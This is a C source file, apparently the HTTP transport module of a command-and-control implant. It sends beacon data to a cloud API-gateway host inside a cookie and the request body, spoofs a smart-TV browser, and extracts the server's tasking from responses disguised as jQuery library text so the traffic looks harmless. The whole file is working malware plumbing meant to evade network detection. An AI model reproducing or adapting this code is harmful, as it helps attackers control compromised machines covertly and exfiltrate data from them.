#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    //修改请求URL和c2profile文件中一致
    char *requestBody = "GET /%s HTTP/1.1\r\n"
        "Host: xxx.gz.apigw.tencentcs.com\r\n"
        "Accept: application/json, text/html, application/xml\r\n"
        "Accept-Language:ar-tn\r\n"
        "Accept-Encoding: *, compress\r\n"
        "Content-Type:application/x-www-form-urltrytryd\r\n"
        "User-Agent: Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.2.1 Chrome/38.0.2125.122 Safari/537.36 WebAppManager\r\n"
        "Cookie: auth_token5OBA=%s\r\n"
        "Referer: http://xxx.gz.apigw.tencentcs.com/\r\n"
        "Connection: close\r\n\r\n";
    char postPayload[20000];
    sprintf(postPayload, requestBody, "Dev/registered/HZUHHW5AFPX", reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);

}
void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    char *requestBody = "POST /%s HTTP/1.1\r\n"
        "Host: xxx.gz.apigw.tencentcs.com\r\n"
        "Accept: application/json, text/html, application/xml\r\n"
        "Accept-Encoding: *, compress\r\n"
        "User-Agent: Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.2.1 Chrome/38.0.2125.122 Safari/537.36 WebAppManager\r\n"
        "Cookie: auth_token5OBA=%s\r\n"
        "Referer: http://xxx.gz.apigw.tencentcs.com/\r\n"
        "Connection: close\r\n"
        "Content-Length: %d\r\n\r\n%s";
    char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);
    sprintf(postPayload, requestBody, "Adapt/disclosure/XT9A6W5YM8", id, strlen(reqData), reqData);

    *outputData_len =  strlen(postPayload);
    *outputData = (char *)calloc(1,  *outputData_len);
    memcpy(*outputData, postPayload, *outputData_len);
    free(postPayload);
}

char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {

    //find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据

    // ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -> AAAABBBBCCCCDDDD

    // *payload_len = xx; // 返回找到的payload长度
    // return payload; // 返回找到的payload
    rawData = strstr(rawData, start) + strlen(start);

    *payload_len = strlen(rawData) - strlen(strstr(rawData, end));

    char *payload = (char *)calloc(*payload_len ,sizeof(char));
    memcpy(payload, rawData, *payload_len);
    return payload;
}

void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {

    char *start = "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
    char *end = "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;

}

void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {

    char *start = "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";
    char *end = "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";

    long long payload_len = 0;
    *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
    *outputData_len = payload_len;
}